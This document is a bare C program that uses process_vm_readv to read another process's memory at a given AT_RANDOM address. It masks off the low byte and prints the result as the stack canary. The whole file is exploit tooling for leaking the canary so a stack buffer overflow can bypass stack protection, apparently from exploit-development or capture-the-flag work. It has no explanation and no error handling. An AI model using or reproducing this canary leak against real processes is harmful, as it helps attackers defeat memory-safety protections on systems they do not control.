

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/uio.h>

void read_memory(pid_t pid, uint32_t atrandom, char* buf, size_t buflen)
{
	struct iovec local[1];
	struct iovec remote[1];

	local->iov_base = buf;
	local->iov_len = buflen;
	remote->iov_base = (void*)atrandom;
	remote->iov_len = buflen;

	process_vm_readv(pid, local, 1, remote, 1, 0);

	return ;
}


int main(int argc, char** argv)
{
	pid_t pid;
	uint32_t atrandom;
	uint32_t canary;
	char buf[4];
	int buflen = sizeof(buf);

	pid = atoi(argv[1]);
	atrandom = atoi(argv[2]);

	read_memory(pid, atrandom, buf, buflen);

	canary = ((uint32_t*)buf)[0] & (uint32_t)~0xff;
	printf("%#x\n", canary);
	return 0;
}




